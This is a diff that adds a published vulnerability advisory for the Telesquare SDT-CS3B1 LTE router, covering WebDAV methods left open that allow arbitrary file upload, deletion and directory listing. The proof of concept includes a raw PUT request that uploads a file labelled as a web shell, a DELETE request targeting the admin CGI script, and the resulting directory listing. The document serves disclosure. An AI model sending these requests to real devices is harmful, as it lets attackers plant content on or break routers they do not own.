@@ -1,0 +1,90 @@
+
+Telesquare SKT LTE Router SDT-CS3B1 WebDAV HTTP Methods Arbitrary File Events
+
+
+Vendor: Telesquare Co., Ltd.
+Product web page: http://www.telesquare.co.kr
+Affected version: FwVer: SDT-CS3B1, sw version 1.2.0
+                  LteVer: ML300S5XEA41_090  1 0.1.0
+                  Modem model: PM-L300S
+
+Summary: We introduce SDT-CS3B1 LTE router which is a SKT 3G and 4G
+LTE wireless communication based LTE router product.
+
+Desc: WebDAV is enabled with directory listing and dangerous HTTP
+methods allowed: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH,
+LOCK and UNLOCK. The HTTP PUT method is normally used to upload data
+that is saved on the server at a user-supplied URL. An attacker can
+place arbitrary, and potentially malicious, content into the application.
+Depending on the server's configuration, this may lead to compromise
+of the server (by uploading server-executable code), or other attacks.
+The other methods can be used to delete/move/overwrite/create files
+and cause denial of service scenarios and/or phishing attacks.
+
+Tested on: lighttpd/1.4.20
+           Linux/mips
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2017-5446
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5446.php
+
+
+22.12.2017
+
+--
+
+
+---
+PUT /ssi.shtml HTTP/1.1
+User-Agent: ZSL_WebDAV_client/1.0
+Connection: TE
+TE: trailers
+Host: 10.0.0.17:8081
+Content-Length: 29
+Content-Type: text/html
+
+<title>ZSL_SSI_wSHELL</title>
+
+
+---
+DELETE /cgi-bin/admin.cgi HTTP/1.1
+User-Agent: ZSL_WebDAV_client/1.0
+Connection: TE
+TE: trailers
+Host: 10.0.0.17:8081
+
+
+---
+WebDAV Enabled
+Directory listing of /:
+
+|   WebDAV type: Unkown
+|   Directory Listing: 
+|     http://10.0.0.17/
+|     http://10.0.0.17/admin
+|     http://10.0.0.17/webdav
+|     http://10.0.0.17/login.shtml
+|     http://10.0.0.17/firewall
+|     http://10.0.0.17/traffic
+|     http://10.0.0.17/js
+|     http://10.0.0.17/serial
+|     http://10.0.0.17/nas
+|     http://10.0.0.17/leftMenu.html
+|     http://10.0.0.17/internet
+|     http://10.0.0.17/home.shtml
+|     http://10.0.0.17/images
+|     http://10.0.0.17/wifi2g
+|     http://10.0.0.17/css
+|     http://10.0.0.17/cgi-bin
+|     http://10.0.0.17/amtlsq
+|     http://10.0.0.17/top.shtml
+|     http://10.0.0.17/modem
+|     http://10.0.0.17/wifi5g
+|     http://10.0.0.17/index.html
+|     http://10.0.0.17/lte
+|     http://10.0.0.17/m2mp
+|     http://10.0.0.17/serialmodem
